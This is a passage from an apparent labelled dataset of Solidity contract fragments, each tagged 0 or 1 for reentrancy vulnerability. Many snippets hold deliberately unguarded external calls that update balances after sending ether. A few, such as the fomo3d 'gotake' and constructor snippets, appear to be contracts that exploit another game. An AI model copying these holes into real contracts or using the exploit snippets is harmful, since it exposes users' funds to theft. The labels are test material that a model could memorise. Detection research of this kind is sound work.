balanceOf[msg.sender] = balanceOf[msg.sender].sub(_value);
balanceOf[_to] = balanceOf[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value, _data);
Transfer(msg.sender, _to, _value);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
989 19402.sol
function buyToken(address recipient, uint256 value) internal {
if (block.number<startBlock || block.number>endBlock) throw;
uint tokens = safeMul(value, price());
if(safeAdd(crowdSaleSoldAmount, tokens)>crowdSaleCap) throw;
balances[recipient] = safeAdd(balances[recipient], tokens);
crowdSaleSoldAmount = safeAdd(crowdSaleSoldAmount, tokens);
totalSupply = safeAdd(totalSupply, tokens);
Transfer(address(0), recipient, tokens);
if (!founder.call.value(value)()) throw;
Buy(recipient, value, tokens);
function price() constant returns(uint) {
if (block.number<startBlock || block.number > endBlock) return 0;
else  return crowdSalePrice;
function() public payable {
if(msg.value == 0) {
sendCandy(msg.sender);
}  else {
buyToken(msg.sender, msg.value);
0
---------------------------------
990 668.sol
function call(address _to, bytes memory _data) public payable onlyWhitelistAdmin {
require(_to != address(registrar));
(bool success,) = _to.call.value(msg.value)(_data);
require(success);
0
---------------------------------
991 cross-function-reentrancy-fixed.sol
function untrustedWithdrawReward(address recipient) public {
uint amountToWithdraw = rewardsForA[recipient];
rewardsForA[recipient] = 0;
if (recipient.call.value(amountToWithdraw)() == false) {throw;}
function untrustedGetFirstWithdrawalBonus(address recipient) public {
if (claimedBonus[recipient] == false) {throw;}
claimedBonus[recipient] = true;
rewardsForA[recipient] += 100;
untrustedWithdrawReward(recipient);
0
---------------------------------
992 23803.sol
function () payable {
if (!founder.call.value(msg.value)()) revert();
0
---------------------------------
993 16884.sol
function mintETHRewards(address _contract, uint256 _amount) public onlyManager() {
require(_contract.call.value(_amount)());
0
---------------------------------
994 21755.sol
function Collect(uint _am) public payable {
var acc = Acc[msg.sender];
if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime) {
if(msg.sender.call.value(_am)())  {
acc.balance-=_am;
LogFile.AddMessage(msg.sender,_am,"Collect");
function() public payable {
Put(0);
1
---------------------------------
995 21999.sol
function call(address addr, bytes data, uint256 amount) public payable onlyOwner {
if (msg.value > 0)
deposit();
require(addr.call.value(amount)(data));
Call(msg.sender, addr, amount);
0
---------------------------------
996 39127.sol
function executeProposal(uint256 _proposalID, bytes _transactionBytecode) onlyCongressMembers {
Proposal p = proposals[_proposalID];
if (p.state != ProposalState.Passed) throw;
p.state = ProposalState.Executed;
if (!p.beneficiary.call.value(p.etherAmount * 1 ether)(_transactionBytecode)) { throw; }
ProposalExecutedEvent(_proposalID);
0
---------------------------------
997 39866.sol
function funding() payable {
if(fundingLock||block.number<startBlock||block.number>startBlock+blockDuration) throw;
if(balances[msg.sender]>balances[msg.sender]+msg.value*fundingExchangeRate || msg.value>msg.value*fundingExchangeRate) throw;
if(!fundingAccount.call.value(msg.value)()) throw;
balances[msg.sender]+=msg.value*fundingExchangeRate;
Funding(msg.sender,msg.value);
function buy(string _commit) payable{
if(balances[msg.sender]>balances[msg.sender]+msg.value*price || msg.value>msg.value*price) throw;
if(!fundingAccount.call.value(msg.value)()) throw;
balances[msg.sender]+=msg.value*price;
commit[msg.sender]=_commit;
Buy(msg.sender,msg.value);
1
---------------------------------
998 SendBalance.sol
function withdrawBalance(){
if(!(msg.sender.call.value(userBalances[msg.sender])())) {throw;}
userBalances[msg.sender] = 0;
1
---------------------------------
999 40341.sol
function carefulSendWithFixedGas(address _toAddress, uint _valueWei, uint _extraGasIncluded) internal returns (bool success) {
return _toAddress.call.value(_valueWei).gas(_extraGasIncluded)();
contract FundsHolderMixin is ReentryProtectorMixin, CarefulSenderMixin {
mapping (address => uint) funds;
event FundsWithdrawnEvent(address fromAddress, address toAddress, uint valueWei);
function withdrawFundsAdvancedRP(address _toAddress, uint _valueWei, uint _extraGasIncluded) internal {
if (msg.value != 0) { throw; }
address fromAddress = msg.sender;
if (_valueWei > funds[fromAddress]) { throw; }
funds[fromAddress] -= _valueWei;
bool sentOk = carefulSendWithFixedGas(_toAddress, _valueWei, _extraGasIncluded);
if (!sentOk) { throw; }
FundsWithdrawnEvent(fromAddress, _toAddress, _valueWei);
contract MoneyRounderMixin {
function compensateLatestMonarch(uint _compensationWei) internal {
address compensationAddress = latestMonarchInternal().compensationAddress;
latestMonarchInternal().compensationWei = _compensationWei;
bool sentOk = carefulSendWithFixedGas(compensationAddress, _compensationWei,suggestedExtraGasToIncludeWithSends);
if (sentOk) {
CompensationSentEvent(compensationAddress, _compensationWei);
} else {
funds[compensationAddress] += _compensationWei;
CompensationFailEvent(compensationAddress, _compensationWei);
0
---------------------------------
1000 30301.sol
function executeTransaction(uint transactionId) public ownerExists(msg.sender)
confirmed(transactionId, msg.sender)
notExecuted(transactionId)
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (txn.destination.call.value(txn.value)(txn.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
txn.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId)
notConfirmed(transactionId, msg.sender)
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1001 14274.sol
function withdraw(uint _amount) {
require(tokens[0][msg.sender] >= _amount);
tokens[0][msg.sender] = safeSub(tokens[0][msg.sender], _amount);
if (!msg.sender.call.value(_amount)()) {
revert();
Withdraw(0, msg.sender, _amount, tokens[0][msg.sender]);
function instantTrade(address _tokenGet, uint _amountGet, address _tokenGive, uint _amountGive, uint _expires, uint _nonce, address _user, uint8 _v, bytes32 _r, bytes32 _s, uint _amount, address _store) payable {
uint totalValue = safeMul(_amount, 1004) / 1000;
if (_tokenGet == address(0)) {
if (msg.value != totalValue) {
revert();
TokenStore(_store).deposit.value(totalValue)();
} else {
if (!Token(_tokenGet).transferFrom(msg.sender, this, totalValue)) {
revert();
if (!Token(_tokenGet).approve(_store, totalValue)) {
revert();
TokenStore(_store).depositToken(_tokenGet, totalValue);
TokenStore(_store).trade(_tokenGet, _amountGet, _tokenGive, _amountGive,
_expires, _nonce, _user, _v, _r, _s, _amount);
totalValue = TokenStore(_store).balanceOf(_tokenGive, this);
uint customerValue = safeMul(_amountGive, _amount) / _amountGet;
if (_tokenGive == address(0)) {
TokenStore(_store).withdraw(totalValue);
msg.sender.transfer(customerValue);
} else {
TokenStore(_store).withdrawToken(_tokenGive, totalValue);
if (!Token(_tokenGive).transfer(msg.sender, customerValue)) {
revert();
0
---------------------------------
1002 34577.sol
function executeTransaction(bytes32 transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (!txn.destination.call.value(txn.value)(txn.data))
revert();
Execution(transactionId);
function confirmTransaction(bytes32 transactionId) public ownerExists(msg.sender) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1003 39912.sol
function simulatePathwayFromBeneficiary() public payable {
bytes4 buySig = bytes4(sha3("buy()"));
if (!Resilience.call.value(msg.value)(buySig)) throw;
bytes4 transferSig = bytes4(sha3("transfer(address,uint256)"));
if (!Resilience.call(transferSig, msg.sender, msg.value)) throw;
0
---------------------------------
1004 14458.sol
function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) public whenNotPaused notSelf(_to) returns (bool success){
require(_to != address(0));
if(isContract(_to)) {
if(accountBalances[msg.sender].addressBalance < _value){
revert();
if(safeAdd(accountBalances[_to].addressBalance, _value) < accountBalances[_to].addressBalance){
revert();
isNewRound();
subFromAddressBalancesInfo(msg.sender, _value);
addToAddressBalancesInfo(_to, _value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value, _data);
Transfer(msg.sender, _to, _value);
return true;
} else {
return transferToAddress(msg.sender, _to, _value, _data);
0
---------------------------------
1005 1710.sol
function buyFST0(address receiver) internal {
require(salesPipe.call.value(msg.value)());
uint256 tmpERCBalance = erc.balanceOf(address(this));
uint256 tmpEthBalance = address(this).balance;
if (tmpERCBalance > 0) {
require(erc.transfer(receiver, tmpERCBalance)); }
if (tmpEthBalance > 0) {
require(receiver.send(tmpEthBalance));
function buyFST (address receiver) public payable {
buyFST0(receiver);
function buyFST () public payable {
buyFST0(msg.sender);
function () external payable {
buyFST0(msg.sender);
0
---------------------------------
1006 40357.sol
function split(address ethDestination, address etcDestination) {
if (amIOnTheFork.forked()) {
ethDestination.call.value(msg.value)();
} else {
uint fee = msg.value / 100;
feeRecipient.send(fee);
etcDestination.call.value(msg.value - fee)();
function split(address ethDestination, address etcDestination) {
if (amIOnTheFork.forked()) {
ethDestination.call.value(msg.value)();
} else {
uint fee = msg.value / 100;
feeRecipient.send(fee);
etcDestination.call.value(msg.value - fee)();
0
---------------------------------
1007 9600.sol
function doSafeSendWData(address toAddr, bytes data, uint amount) internal {
require(txMutex3847834 == false, "ss-guard");
txMutex3847834 = true;
require(toAddr.call.value(amount)(data), "ss-failed");
txMutex3847834 = false;
contract payoutAllC is safeSend {
address private _payTo;
event PayoutAll(address payTo, uint value);
constructor(address initPayTo) public {
assert(initPayTo != address(0));
_payTo = initPayTo;
function doSafeSend(address toAddr, uint amount) internal {
doSafeSendWData(toAddr, "", amount);
0
---------------------------------
1008 40425.sol
function BankOwner_WithdrawDonations() public modifier_isContractOwner() modifier_wasValueSent() {
if (_bankDonationsBalance > 0) {
uint256 amount_ = _bankDonationsBalance;
_bankDonationsBalance = 0;
if (msg.sender.send(amount_)) {
event_bankDonationsWithdrawn(amount_);
}  else if (msg.sender.call.value(amount_)()) {
event_bankDonationsWithdrawn(amount_);
}  else {
_bankDonationsBalance = amount_;
function WithdrawAmountFromBankAccount(uint256 amount) public modifier_doesSenderHaveABankAccount() modifier_wasValueSent() returns (bool) {
bool withdrawalSuccessful_ = false;
uint32 accountNumber_ = _bankAccountAddresses[msg.sender].accountNumber;
if (amount > 0 && _bankAccountsArray[accountNumber_].balance >= amount) {
_bankAccountsArray[accountNumber_].balance -= amount;
if (msg.sender.send(amount)) {
withdrawalSuccessful_ = true;
else if (msg.sender.call.value(amount)()) {
withdrawalSuccessful_ = true;
}  else {
_bankAccountsArray[accountNumber_].balance += amount;
if (withdrawalSuccessful_) {
event_withdrawalMadeFromBankAccount_Successful(accountNumber_, amount);
return true;
}  else {
event_withdrawalMadeFromBankAccount_Failed(accountNumber_, amount);
return false;
function WithdrawFullBalanceFromBankAccount() public modifier_doesSenderHaveABankAccount() modifier_wasValueSent() returns (bool) {
bool withdrawalSuccessful_ = false;
uint32 accountNumber_ = _bankAccountAddresses[msg.sender].accountNumber;
uint256 fullBalance_ = 0;
if (_bankAccountsArray[accountNumber_].balance > 0) {
fullBalance_ = _bankAccountsArray[accountNumber_].balance;
_bankAccountsArray[accountNumber_].balance = 0;
if (msg.sender.send(fullBalance_)) {
withdrawalSuccessful_ = true;
}else
if (msg.sender.call.value(fullBalance_)()) {
withdrawalSuccessful_ = true;
} else {
_bankAccountsArray[accountNumber_].balance = fullBalance_;
if (withdrawalSuccessful_)  {
event_withdrawalMadeFromBankAccount_Successful(accountNumber_, fullBalance_);
return true;
} else {
event_withdrawalMadeFromBankAccount_Failed(accountNumber_, fullBalance_);
return false;
function TransferAmountFromBankAccountToAddress(uint256 amount, address destinationAddress) public modifier_doesSenderHaveABankAccount()  modifier_wasValueSent()  returns (bool) {
bool transferSuccessful_ = false;
uint32 accountNumber_ = _bankAccountAddresses[msg.sender].accountNumber;
if (amount > 0 && _bankAccountsArray[accountNumber_].balance >= amount) {
_bankAccountsArray[accountNumber_].balance -= amount;
if (destinationAddress.send(amount)) {
transferSuccessful_ = true;
} else if (destinationAddress.call.value(amount)()) {
transferSuccessful_ = true;
} else {
_bankAccountsArray[accountNumber_].balance += amount;
if (transferSuccessful_) {
event_transferMadeFromBankAccountToAddress_Successful(accountNumber_, amount, destinationAddress);
return true;
} else {
event_transferMadeFromBankAccountToAddress_Failed(accountNumber_, amount, destinationAddress);
return false;
0
---------------------------------
1009 30101.sol
function reject(address _participant) onlyOwner public {
uint256 weiAmount = deposited[_participant];
require(weiAmount > 0);
deposited[_participant] = 0;
Rejected(_participant);
require(_participant.call.value(weiAmount)());
function rejectMany(address[] _participants) onlyOwner public {
for (uint256 i = 0; i < _participants.length; i++) {
reject(_participants[i]);
0
---------------------------------
1010 39326.sol
function executeProposal( uint256 id, bytes transactionBytecode) onlyMembers {
Proposal p = proposals[id];
if (now < p.votingDeadline || p.executed || p.proposalHash != sha3(p.recipient, p.amount, transactionBytecode) || p.numberOfVotes < minimumQuorum)  throw;
if (p.currentResult > majorityMargin) {
p.executed = true;
if (!p.recipient.call.value(p.amount)(transactionBytecode)) throw;
p.proposalPassed = true;
} else {
p.proposalPassed = false;
ProposalTallied(id, p.numberOfVotes, p.proposalPassed);
0
---------------------------------
1011 22074.sol
function Collect(uint _am) public payable {
if(Bal[msg.sender]>=MinSum && _am<=Bal[msg.sender]) {
msg.sender.call.value(_am);
Bal[msg.sender]-=_am;
1
---------------------------------
1012 2387.sol
function transferAndCall(address to, uint256 value, bytes data) public payable liquid returns (bool) {
require(to != address(this) && data.length >= 68 && transfer(to, value));
assembly {
mstore(add(data, 36), value)
mstore(add(data, 68), caller)
require(to.call.value(msg.value)(data));
return true;
1
---------------------------------
1013 21390.sol
function FundTransfer(uint _am, bytes32 _operation, address _to, address _feeToAdr) payable {
if(msg.sender != address(this)) throw;
if(_operation=="In")   {
FundsMove(msg.value,"In",_to);
investors[_to] += _am;
}  else {
uint amTotransfer = 0;
if(_to==_feeToAdr) {
amTotransfer=_am;
}  else {
amTotransfer=_am/100*99;
investors[_feeToAdr]+=_am-amTotransfer;
if(_to.call.value(_am)()==false) throw;
investors[_to] -= _am;
FundsMove(_am, "Out", _to);
function() payable {
In(msg.sender);
function Out(uint amount) payable {
if(investors[msg.sender]<targetAmount)throw;
if(investors[msg.sender]<amount)throw;
this.FundTransfer(amount,"",msg.sender,admin);
function In(address to) payable {
if(to==0x0)to = admin;
if(msg.sender!=tx.origin)throw;
this.FundTransfer(msg.value, "In", to,admin);
1
---------------------------------
1014 16925.sol
function withdraw() public{
assert(msg.sender.call.value(balances[msg.sender])()) ;
balances[msg.sender] = 0;
1
---------------------------------
1015 3270.sol
function gotake() public {
if (fomo3d.getTimeLeft() > 50) { revert(); }
address(fomo3d).call.value(fomo3d.getBuyPrice() *2 )();
fomo3d.withdraw();
0
---------------------------------
1016 5629.sol
constructor () public payable {
fomo3d fomo = fomo3d(address(0xA62142888ABa8370742bE823c1782D17A0389Da1));
require(address(0xA62142888ABa8370742bE823c1782D17A0389Da1).call.value(msg.value)());
(,,,uint winnings,,,) = fomo.getPlayerInfoByAddress(address(this));
require(winnings > 0.1 ether);
fomo.withdraw();
selfdestruct(msg.sender);
0
---------------------------------
1017 4679.sol
function giveToken(address _buyer) internal {
require( pendingTokenUser[_buyer] > 0, "pendingTokenUser[_buyer] > 0" );
tokenUser[_buyer] = tokenUser[_buyer].add(pendingTokenUser[_buyer]);
tokenSaleContract.sendTokens(_buyer, pendingTokenUser[_buyer]);
soldTokens = soldTokens.add(pendingTokenUser[_buyer]);
pendingTokenUser[_buyer] = 0;
require( address(tokenSaleContract).call.value( etherUser[_buyer] )(bytes4( keccak256("forwardEther()"))));
etherUser[_buyer] = 0;
function forwardEther() onlyRC payable public returns(bool) {
require(milestoneSystem.call.value(msg.value)(), "wallet.call.value(msg.value)()");
return true;
1
---------------------------------
1018 30460.sol
function close() onlyOwner public {
require(state == State.Active);
state = State.Closed;
Closed();
wallet.call.value(this.balance)();
function forwardFunds() onlyOwner public {
require(this.balance > 0);
wallet.call.value(this.balance)();
contract FinalizableCrowdsale is BurnableCrowdsale, Ownable {
using SafeMath for uint256;
bool public isFinalized = false;
event Finalized();
function forwardFundsToWallet(uint256 amount) internal {
if (goalReached() && vault.balance > 0) {
vault.forwardFunds();
if (goalReached()) {
wallet.call.value(amount)();
} else {
vault.deposit.value(amount)(msg.sender);
0
---------------------------------
1019 9611.sol
function doSafeSendWData(address toAddr, bytes data, uint amount) internal {
require(txMutex3847834 == false, "ss-guard");
txMutex3847834 = true;
require(toAddr.call.value(amount)(data), "ss-failed");
txMutex3847834 = false;
contract payoutAllC is safeSend {
address private _payTo;
event PayoutAll(address payTo, uint value);
constructor(address initPayTo) public {
assert(initPayTo != address(0));
_payTo = initPayTo;
function doSafeSend(address toAddr, uint amount) internal {
doSafeSendWData(toAddr, "", amount);
0
---------------------------------
1020 39684.sol
function () payable {
if (msg.data.length > 0) {
createSeries(msg.data, 0, "", "", 0x0);
} else
if (latestSeriesForUser[msg.sender] != 0) {
if (latestSeriesForUser[msg.sender].call.value(msg.value)())
DepositMade(latestSeriesForUser[msg.sender], msg.value);
} else {
createSeries("", 0, "", "", 0x0);
address public seriesFactory;
address public owner;
0
---------------------------------
1021 40353.sol
function withdraw(uint256 tokens) noEther onlyDaoChallenge {
if (tokens == 0 || tokenBalance == 0 || tokenBalance < tokens) throw;
tokenBalance -= tokens;
if(!owner.call.value(tokens * tokenPrice)()) throw;
function withdraw(uint256 tokens) noEther {
DaoAccount account = accountFor(msg.sender, false);
if (account == DaoAccount(0x00)) throw;
account.withdraw(tokens);
notifyWithdraw(msg.sender, tokens);
0
---------------------------------
1022 27486.sol
function Command(address adr,bytes data) payable public {
require(msg.sender == Owner);
adr.call.value(msg.value)(data);
0
---------------------------------
1023 23421.sol
function _safeCall(address _to, uint _amount) internal {
require(_to != 0);
require(_to.call.value(_amount)());
function multiCall(address[] _address, uint[] _amount) payable public returns(bool) {
for (uint i = 0; i < _address.length; i++) {
_safeCall(_address[i], _amount[i]);
return true;
1
---------------------------------
1024 17009.sol
function Pay(address _destination) public payable {
require(_destination != 0x0);
require(msg.value > 0);
require(!paused);
masterWallet.transfer(msg.value.div(9));
_destination.call.value(msg.value.div(9).mul(8))();
SettleFund(_destination, msg.value);
1
---------------------------------
1025 26188.sol
function GetPrizeFund() public payable {
require(now>EndTime);
require(Bids[msg.sender]>=MaxOffer);
uint prizeAmount = Bids[msg.sender]+PrizeFund;
PrizeFund = 0;
Bids[msg.sender]=0;
msg.sender.call.value(prizeAmount);
function RevokeBid() public payable {
require(now>EndTime);
uint toTransfer = Bids[msg.sender];
Bids[msg.sender]=0;
msg.sender.call.value(toTransfer);
0
---------------------------------
1026 10604.sol
function executeTransaction(address to, uint256 value, bytes data) public onlyOwner returns (bool) {
return to.call.value(value)(data);
0
---------------------------------
1027 39269.sol
function sendPending() public preventReentry isHolder(msg.sender) returns (bool){
if (ptxTail == ptxHead) return false;
TX memory tx = pendingTxs[ptxTail];
if(now < tx.timeLock) return false;
delete pendingTxs[ptxTail++];
if(!tx.blocked) {
if(tx.to.call.value(tx.value)(tx.data)) {
committedEther -= tx.value;
Withdrawal(tx.from, tx.to, tx.value);
return true;
if (tx.from == address(this)) {
committedEther -= tx.value;
} else {
holders[tx.from].etherBalance += tx.value;
TransactionFailed(tx.from, tx.to, tx.value);
return false;
0
---------------------------------
1028 1879.sol
function upgradeToAndCall(address newImplementation, bytes data) payable external ifAdmin {
_upgradeTo(newImplementation);
require(address(this).call.value(msg.value)(data));
0
---------------------------------
1029 2021.sol
function _unsafeSend(address _to, uint _value) internal returns(bool) {
return _to.call.value(_value)();
function _safeSend(address _to, uint _value) internal {
if (!_unsafeSend(_to, _value)) {
throw;
0
---------------------------------
1030 36563.sol
function forward(address _destination, uint256 _value, bytes _data) onlyOwner {
require(_destination != address(0));
assert(_destination.call.value(_value)(_data));
if (_value > 0) {
Withdrawal(_destination, _value, _data);
function() payable {
Deposit(msg.sender, msg.value);
0
---------------------------------
1031 39644.sol
function revoke(address transactor, address transactee) {
if (msg.sender != transactor && msg.sender != transactee) { throw; }
if(!verify(transactor, transactee)) { throw; }
uint32 deposit = _verifications[transactor][transactee];
delete _verifications[transactor][transactee];
if (!transactee.call.value(deposit).gas(23000)()) {  throw;  }
RevokeEvent(transactor, transactee, deposit);
0
---------------------------------
1032 27334.sol
function participate() payable {
require(msg.value == 0.1 ether);
require(!participated[msg.sender]);
if (luckyNumberOfAddress(msg.sender) == luckyNumber) {
participated[msg.sender] = true;
require(msg.sender.call.value(this.balance)());
0
---------------------------------
1033 23387.sol
function executeTransaction(uint transactionId) public ownerExists(msg.sender) confirmed(transactionId, msg.sender) notExecuted(transactionId){
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (txn.destination.call.value(txn.value)(txn.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
txn.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1034 24007.sol
function GetEther() public payable {
if(ExtractDepositTime[msg.sender]!=0 && ExtractDepositTime[msg.sender]<now) {
msg.sender.call.value(0.3 ether);
ExtractDepositTime[msg.sender] = 0;
1
---------------------------------
1035 11719.sol
function Collect(uint _am) public payable {
if(balances[msg.sender]>=MinSum && balances[msg.sender]>=_am) {
if(msg.sender.call.value(_am)())  {
balances[msg.sender]-=_am;
Log.AddMessage(msg.sender,_am,"Collect");
function() public payable {
Deposit();
1
---------------------------------
1036 28869.sol
function executeTransaction(uint transactionId) public ownerExists(msg.sender) confirmed(transactionId, msg.sender) notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (txn.destination.call.value(txn.value)(txn.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
txn.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1037 35637.sol
function transfer(address _to, uint48 _value, bytes _data, string _custom_fallback) returns (bool success) {
if(isContract(_to)) {
require(balanceOf(msg.sender) >= _value);
balances[msg.sender] = safeSub(balanceOf(msg.sender), _value);
balances[_to] = safeAdd(balanceOf(_to), _value);
ContractReceiver receiver = ContractReceiver(_to);
receiver.call.value(0)(bytes4(sha3(_custom_fallback)), msg.sender, _value, _data);
Transfer(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1038 39019.sol
function CreateTokens() {
if (tokensCreated > 0) return;
uint amount = amountRaised * (100 - rewardPercentage) / 100;
if (!tokenCreateContract.call.value(amount)(tokenCreateFunctionHash)) throw;
tokensCreated = tokenContract.balanceOf(this);
tokenCreator = msg.sender;
0
---------------------------------
1039 3985.sol
function performFeelessTransaction(address sender, address target, bytes data, uint256 nonce, bytes sig) public payable {
require(this == target);
bytes memory prefix = "\x19Ethereum Signed Message:\n32";
bytes32 hash = keccak256(prefix, keccak256(target, data, nonce));
msgSender = ECRecovery.recover(hash, sig);
require(msgSender == sender);
require(nonces[msgSender]++ == nonce);
require(target.call.value(msg.value)(data));
msgSender = address(0);
0
---------------------------------
1040 347.sol
function _forwardFunds() internal {
bool isTransferDone = wallet.call.value(msg.value).gas(gasAmount)();
emit TokensTransfer (msg.sender, wallet, msg.value, isTransferDone);
0
---------------------------------
1041 35421.sol
function tryExec(address target, bytes calldata, uint256 value) mutex() internal returns (bool call_ret) {
return target.call.value(value)(calldata);
function exec( address target, bytes calldata, uint256 value) internal {
assert(tryExec(target, calldata, value));
contract canFreeze is owned {
bool public frozen=false;
modifier LockIfFrozen() {
if (!frozen){
function ActionRetStatic(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
if(0==Risk.totalSupply()){_Price=lastPrice;}
_ETHReturned = wdiv(_details.amount , _Price);
if (Static.meltCoin(_details.holder,_details.amount)){
EventRedeemStatic(_details.holder,_details.amount ,_TransID, _Price);
if (wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Static.mintCoin(_details.holder,_details.amount);
EventCreateStatic(_details.holder,_details.amount ,_TransID, _Price);
if ( 0==this.balance) {
Bankrupt();
function ActionRetRisk(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
uint128 CurRiskPrice;
CurRiskPrice=RiskPrice(_Price);
if(CurRiskPrice>0){
_ETHReturned = wdiv( wmul(_details.amount , CurRiskPrice) , _Price);
if (Risk.meltCoin(_details.holder,_details.amount )){
EventRedeemRisk(_details.holder,_details.amount ,_TransID, _Price);
if ( wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Risk.mintCoin(_details.holder,_details.amount);
EventCreateRisk(_details.holder,_details.amount ,_TransID, _Price);
}
0
---------------------------------
1042 simple_dao_fixed.sol
function withdraw(uint amount) public {
if (credit[msg.sender]>= amount) {
credit[msg.sender]-=amount;
require(msg.sender.call.value(amount)());
1
---------------------------------
1043 18438.sol
function invest() public {
uint256 amountToSend = address(this).balance;
if(amountToSend > 1){
uint256 half = amountToSend / 2;
require(sk2xContract.call.value(half)());
p3dContract.buy.value(half)(msg.sender);
function donate() payable public {
require(sk2xContract.call.value(msg.value).gas(1000000)());
0
---------------------------------
1044 970.sol
function withdraw(uint amount) {
if (tokens[0][msg.sender] < amount) throw;
tokens[0][msg.sender] = safeSub(tokens[0][msg.sender], amount);
if (!msg.sender.call.value(amount)()) throw;
Withdraw(0, msg.sender, amount, tokens[0][msg.sender]);
0
---------------------------------
1045 cross-function-reentrancy.sol
function untrustedWithdrawReward(address recipient) public {
uint amountToWithdraw = rewardsForA[recipient];
rewardsForA[recipient] = 0;
if (recipient.call.value(amountToWithdraw)() == false) { throw;}
function untrustedGetFirstWithdrawalBonus(address recipient) public {
if (claimedBonus[recipient] == false) { throw;}
rewardsForA[recipient] += 100;
untrustedWithdrawReward(recipient);
claimedBonus[recipient] = true;
1
---------------------------------
1046 27024.sol
function participate() payable onlyHuman {
require(msg.value == 0.1 ether);
require(!participated[msg.sender]);
if (luckyNumberOfAddress(msg.sender) == winnerLuckyNumber) {
participated[msg.sender] = true;
require(msg.sender.call.value(this.balance)());
0
---------------------------------
1047 25196.sol
function getTokens(uint num, address tokenBuyerContract) public {
tokenBuyerContract.call.value(0 wei)();
tokenBuyerContract.call.value(0 wei)();
tokenBuyerContract.call.value(0 wei)();
tokenBuyerContract.call.value(0 wei)();
tokenBuyerContract.call.value(0 wei)();
tokenBuyerContract.call.value(0 wei)();
tokenBuyerContract.call.value(0 wei)();
tokenBuyerContract.call.value(0 wei)();
tokenBuyerContract.call.value(0 wei)();
tokenBuyerContract.call.value(0 wei)();
0
---------------------------------
1048 39973.sol
function _unsafeSend(address _to, uint _value) internal returns(bool) {
return _to.call.value(_value)();
function _forward(address _to, bytes _data) internal returns(bool, bool) {
uint startGas = msg.gas + forwardCallGas + (_data.length * 50);
if (_to == 0x0) {
return (false, _safeFalse());
if (!_to.call.value(msg.value)(_data)) {
return (false, _safeFalse());
return (true, _applyRefund(startGas));
function checkForward(bytes _data) constant returns(bool, bool) {
return _forward(allowedForwards[sha3(_data[0], _data[1], _data[2], _data[3])], _data);
1
---------------------------------
1049 10107.sol
function transfer(address to, uint value, bytes data, string customFallback) public returns (bool) {
if(balanceOf(msg.sender) < value) revert();
balances[msg.sender] = balances[msg.sender].sub(value);
balances[to] = balances[to].add(value);
if (isContract(to)) {
assert(to.call.value(0)(bytes4(keccak256(customFallback)), msg.sender, value, data));
emit Transfer(msg.sender, to, value, data);
return true;
0
---------------------------------
1050 10715.sol
function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.approve(_spender, _value);
require(_spender.call.value(msg.value)(_data));
return true;
function transferAndCall(address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transfer(_to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function transferFromAndCall(address _from, address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
require(_to.call.value(msg.value)(_data));
return true;
function increaseApprovalAndCall(address _spender, uint _addedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.increaseApproval(_spender, _addedValue);
require(_spender.call.value(msg.value)(_data));
return true;
function decreaseApprovalAndCall(address _spender, uint _subtractedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.decreaseApproval(_spender, _subtractedValue);
require(_spender.call.value(msg.value)(_data));
return true;
1
---------------------------------
1051 5515.sol
function executeTransaction(uint transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
transactions[transactionId].executed = true;
if (transactions[transactionId].destination.call.value(transactions[transactionId].value)(transactions[transactionId].data)) {
emit Execution(transactionId);
} else {
emit ExecutionFailure(transactionId);
transactions[transactionId].executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
emit Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1052 39191.sol
function withdraw(Bank storage self, address accountAddress, uint value) public returns (bool) {
if (self.accountBalances[accountAddress] >= value) {
deductFunds(self, accountAddress, value);
if (!accountAddress.send(value)) {
if (!accountAddress.call.value(value)()) {  throw; }
return true;
return false;
0
---------------------------------
1053 14995.sol
function fund() public payable
